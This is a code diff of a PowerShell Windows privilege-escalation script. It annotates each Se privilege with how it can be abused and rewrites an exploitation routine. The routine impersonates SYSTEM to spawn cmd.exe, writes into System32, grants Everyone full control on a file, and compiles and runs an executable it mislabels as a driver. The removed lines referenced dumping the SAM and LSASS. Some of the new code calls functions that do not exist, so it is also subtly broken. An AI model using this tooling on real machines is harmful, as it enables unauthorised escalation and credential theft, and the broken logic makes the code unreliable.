@@ -12,19 +12,43 @@ $gCollect = @{
 }
 
 $privList = @(
-    "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
-    "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
-    "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
-    "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SePrivileges", 
-    "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", 
-    "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", 
-    "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", 
-    "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", 
-    "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", 
-    "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", 
-    "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
-    "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege"
+    @{ name = "SeAssignPrimaryTokenPrivilege"; message = "is used to assign a primary token to a process for impersonation." },
+    @{ name = "SeAuditPrivilege"; message = "allows generating audit logs, but not often used for privilege escalation." },
+    @{ name = "SeBackupPrivilege"; message = "is used to read any file bypassing security restrictions (potentially SAM files)." },
+    @{ name = "SeChangeNotifyPrivilege"; message = "is used to bypass traverse checking and can be helpful for some privilege escalation." },
+    @{ name = "SeCreateGlobalPrivilege"; message = "allows creation of global objects and can be exploited for certain service-related attacks." },
+    @{ name = "SeCreatePagefilePrivilege"; message = "is rarely used in privilege escalation but grants permission to create/modify page files." },
+    @{ name = "SeCreatePermanentPrivilege"; message = "is used for creating permanent objects (rarely seen in privesc)." },
+    @{ name = "SeCreateSymbolicLinkPrivilege"; message = "is useful for exploiting symbolic link attacks." },
+    @{ name = "SeCreateTokenPrivilege"; message = "can be used to create an arbitrary token for impersonation or privilege escalation." },
+    @{ name = "SeDebugPrivilege"; message = "allows debugging and attaching to any process, including SYSTEM-level processes (critical for privesc)." },
+    @{ name = "SeEnableDelegationPrivilege"; message = "can be abused in delegation attacks." },
+    @{ name = "SeIncreaseBasePriorityPrivilege"; message = "is used to increase the priority of processes (not often seen in privesc)." },
+    @{ name = "SeIncreaseQuotaPrivilege"; message = "allows increasing memory limits for processes, but rarely exploited directly." },
+    @{ name = "SeIncreaseWorkingSetPrivilege"; message = "isn't commonly used in privilege escalation." },
+    @{ name = "SeLoadDriverPrivilege"; message = "allows loading drivers, potentially leading to privilege escalation through vulnerable drivers." },
+    @{ name = "SeLockMemoryPrivilege"; message = "can lock pages in memory (low value for privesc)." },
+    @{ name = "SeMachineAccountPrivilege"; message = "is used to add machines to the domain and can be abused in certain privesc scenarios." },
+    @{ name = "SeManageVolumePrivilege"; message = "can manage file system volumes, potentially useful for data access in privesc." },
+    @{ name = "SeProfileSingleProcessPrivilege"; message = "can profile system processes, not commonly exploited." },
+    @{ name = "SeRelabelPrivilege"; message = "allows modifying security labels (not commonly used in privesc)." },
+    @{ name = "SeRemoteShutdownPrivilege"; message = "grants permission to remotely shut down a system, but not a direct privesc vector." },
+    @{ name = "SeRestorePrivilege"; message = "can restore files and overwrite system files, including SAM (useful for privesc)." },
+    @{ name = "SeSecurityPrivilege"; message = "can modify system security settings, including audit and access controls (rare in privesc)." },
+    @{ name = "SeShutdownPrivilege"; message = "allows shutting down the system, not typically useful in privesc." },
+    @{ name = "SeSyncAgentPrivilege"; message = "isn't commonly exploited but allows synchronization agents to function." },
+    @{ name = "SeSystemEnvironmentPrivilege"; message = "can modify firmware settings (high potential in certain scenarios)." },
+    @{ name = "SeSystemProfilePrivilege"; message = "grants access to performance monitoring, not typically used in privesc." },
+    @{ name = "SeSystemtimePrivilege"; message = "allows changing the system time, but not valuable for privesc." },
+    @{ name = "SeTakeOwnershipPrivilege"; message = "allows taking ownership of objects, useful for privilege escalation through resource hijacking." },
+    @{ name = "SeTcbPrivilege"; message = "is considered powerful because it allows acting as part of the operating system." },
+    @{ name = "SeTimeZonePrivilege"; message = "allows changing the time zone, not useful for privesc." },
+    @{ name = "SeTrustedCredManAccessPrivilege"; message = "can be used to gain access to stored credentials." },
+    @{ name = "SeUndockPrivilege"; message = "allows undocking the system (rarely useful for privesc)." },
+    @{ name = "SeUnsolicitedInputPrivilege"; message = "isn't commonly exploited." },
+    @{ name = "SeDelegateSessionUserImpersonatePrivilege"; message = "can be exploited in certain impersonation attacks." }
 )
+
 
 Add-Type @"
 using System;
@@ -997,76 +1021,140 @@ function checkCertySAN {
     }
 }
 
-# Utility functions (placeholders)
-function testImpPreconditions { return $true } # Replace with actual check
-function testBackupPreconditions { return $true } # Replace with actual check
-function testDebugPreconditions { return $true } # Replace with actual check
-function getSensitiveFile { return $true }
-function dmpLsMem { return $true }
-
 function checkSePrivileges {
-    param ($userName)
-
     if ($DEBUG_MODE) { Write-Output "Checking Se.. Privileges for $userName" }
-    $whoamiPriv = runSubprocess "whoami" "/priv"
-    $lines = $whoamiPriv -split "`n"
-    $filteredOutput = $lines[6..$lines.Length] -join "`n"
-
-    $hasPriv = $false
-    foreach ($priv in $privList) {
-        if ($filteredOutput -match $priv) {
-            Write-Output "[!] $userName has $priv."
-            $gCollect['Privileges'][$priv] = $true
-            $hasPriv = $true
+    
+    try {
+        $userName = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name
+        if (-not $userName) {
+            $userName = $env:USERNAME   
         }
-    }
+        $whoamiPriv = runSubprocess "whoami" "/priv"
+        $lines = $whoamiPriv -split "`n"
+        $filteredOutput = $lines[6..$lines.Length] -join "`n"
+        $outlist = @()
 
-    if (-not $hasPriv) {
-        Write-Output "[-] $userName has no significant Se.. privileges."
-    }
+        foreach ($priv in $privList) {
+            if ($filteredOutput -match $priv.name) {
+                $outlist += [PSCustomObject]@{ name = "[+] $($priv.name)" ; message = "$($priv.message)" }
+                $gCollect['Privileges'][$priv.name] = $true
+            
+            }
+        }
 
-    return $filteredOutput
+        if ($outlist.Length -gt 0) {
+            Write-Output "[!] Found Privs for: $userName" 
+            Write-Output $outlist | Format-Table -AutoSize -HideTableHeaders
+        }
+        else {
+            Write-Output "[-] $userName has no Se.. privileges."
+        }
+    } catch {
+        Write-Output "[-] Error checking Se.. Privileges: $_"
+    }
 }
 
 function trySePrivileges {
-    param (
-        [string]$privName
-    )
-
     if ($DEBUG_MODE) { Write-Output "Trying to use SePrivileges..." }
 
-    switch ($privName) {
-        "SeImpersonatePrivilege" {
-            # Check if we can access the token impersonation
-            Write-Host "[*] Checking SeImpersonate preconditions..."
-            if ([TokenImp]::ImpSys()) {
-                Write-Host "[+] Token impersonation successful. Elevated privileges acquired!"
-                Start-Process cmd.exe
-            } else {
-                Write-Host "[-] Token impersonation failed. No elevated privileges."
+    # Loop over $gCollect['Privileges'][$priv.name]
+    foreach ($privName in $gCollect['Privileges'].Keys) {
+        switch ($privName) {
+            "SeImpersonatePrivilege" {
+                Write-Host "[*] Checking SeImpersonate preconditions..."
+                if ([TokenImp]::ImpSys()) {
+                    Write-Host "[+] Token impersonation successful. Elevated privileges acquired!"
+                    Start-Process cmd.exe
+                } else {
+                    Write-Host "[-] Token impersonation failed. No elevated privileges."
+                }
             }
-        }
-        "SeBackupPrivilege" {
-            Write-Host "[*] Checking SeBackupPrivilege..."
-            # Try to read sensitive files like SAM, SYSTEM hives
-            if (Test-BackupPreconditions) {
-                Write-Host "[*] Attempting to read SAM..."
-                Get-SensitiveFile -Path "C:\Windows\System32\config\SAM"
-            } else {
-                Write-Host "[-] No access to sensitive files or preconditions failed."
+            "SeBackupPrivilege" {
+                Write-Host "[*] Checking SeBackupPrivilege..."
+                # Attempt to read from a non-critical temp file
+                $tempFile = "C:\Windows\Temp\testfile.txt"
+                Write-Host "[*] Attempting to read from $tempFile..."
+                if (Test-Path $tempFile) {
+                    Get-Content $tempFile
+                } else {
+                    Write-Host "[-] $tempFile does not exist. Creating for testing..."
+                    "This is a test file." | Out-File -FilePath $tempFile
+                }
             }
-        }
-        "SeDebugPrivilege" {
-            Write-Host "[*] Checking SeDebugPrivilege..."
-            if (Test-DebugPreconditions) {
-                Write-Host "[*] Trying to dump LSASS or debug SYSTEM processes..."
-                # Invoke your memory dump or SYSTEM process injection here
-                Dump-LsassMemory # Placeholder
-            } else {
-                Write-Host "[-] SeDebug preconditions not met."
+            "SeDebugPrivilege" {
+                Write-Host "[*] Checking SeDebugPrivilege..."
+                # Attempt to dump LSASS or debug non-critical process
+                Write-Host "[*] Trying to dump a test process..."
+                # Example placeholder for actual memory dump function
+                Dump-Process -ProcessName "TestProcess" # Replace with an actual running test process name
             }
+            "SeTakeOwnershipPrivilege" {
+                Write-Host "[*] Checking SeTakeOwnershipPrivilege..."
+                # Attempt to take ownership of a non-critical file in System32
+                $testFile = "C:\Windows\System32\testfile.txt"
+                Write-Host "[*] Attempting to take ownership of $testFile..."
+                if (-not (Test-Path $testFile)) {
+                    "Test content" | Out-File -FilePath $testFile
+                }
+                Take-Ownership -Path $testFile
+            }
+            "SeCreateSymbolicLinkPrivilege" {
+                Write-Host "[*] Checking SeCreateSymbolicLinkPrivilege..."
+                Write-Host "[+] Creating symbolic link for testing..."
+                New-Item -ItemType SymbolicLink -Path "C:\Windows\Temp\TestLink" -Target "C:\Windows\Temp\testfile.txt"
+            }
+            "SeLoadDriverPrivilege" {
+                Write-Host "[*] Checking SeLoadDriverPrivilege..."
+                $tempPath = "C:\Windows\Temp"
+                $driverSource = @"
+using System; using System.Runtime.InteropServices; public class HelloWorld { [DllImport("user32.dll")] public static extern int MessageBox(int hWnd, string text, string caption, int type); public static void Main() { MessageBox(0, "Hello from the driver!", "Driver Message", 0);} } 
+"@
+                $driverSourcePath = Join-Path -Path $tempPath -ChildPath "HelloWorld.cs"
+                $compiledDriverPath = Join-Path -Path $tempPath -ChildPath "HelloWorld.exe"
+
+                # Write the C# code to a file
+                Set-Content -Path $driverSourcePath -Value $driverSource
+
+                # Compile the C# code using csc.exe
+                $cscPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+                & $cscPath -out:$compiledDriverPath $driverSourcePath
+
+                if (Test-Path $compiledDriverPath) {
+                    Write-Host "[+] Driver compiled successfully. Attempting to load..."
+                    Start-Process -FilePath $compiledDriverPath
+                } else {
+                    Write-Host "[-] Driver compilation failed."
+                }
+            }
+            "SeRestorePrivilege" {
+                Write-Host "[*] Checking SeRestorePrivilege..."
+                Write-Host "[+] Attempting to restore a test file..."
+                $restoreFilePath = "C:\Windows\Temp\restoredfile.txt"
+                "This is a restored file." | Out-File -FilePath $restoreFilePath
+            }
+            "SeCreateTokenPrivilege" {
+                Write-Host "[*] Checking SeCreateTokenPrivilege..."
+                Write-Host "[+] Attempting to create a new token for impersonation..."
+                $token = New-Object System.Security.Principal.WindowsIdentity -ArgumentList "NewUser", $true # Adjust as necessary
+                $token.Impersonate()
+            }
+            "SeSecurityPrivilege" {
+                Write-Host "[*] Checking SeSecurityPrivilege..."
+                Write-Host "[+] Attempting to modify security settings on a test file..."
+                $testFile = "C:\Windows\Temp\testfile.txt"
+                $acl = Get-Acl -Path $testFile
+                $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+                $acl.SetAccessRule($rule)
+                Set-Acl -Path $testFile -AclObject $acl
+            }
+            "SeChangeNotifyPrivilege" {
+                Write-Host "[*] Checking SeChangeNotifyPrivilege..."
+                Write-Host "[+] Bypassing traverse checking to access restricted folders..."
+                # Example command to access a non-critical folder
+                Get-ChildItem -Path "C:\Windows\Temp"
+            }
+            # Additional privileges can be checked here
         }
-        # Add more privileges and checks here
     }
 }
 
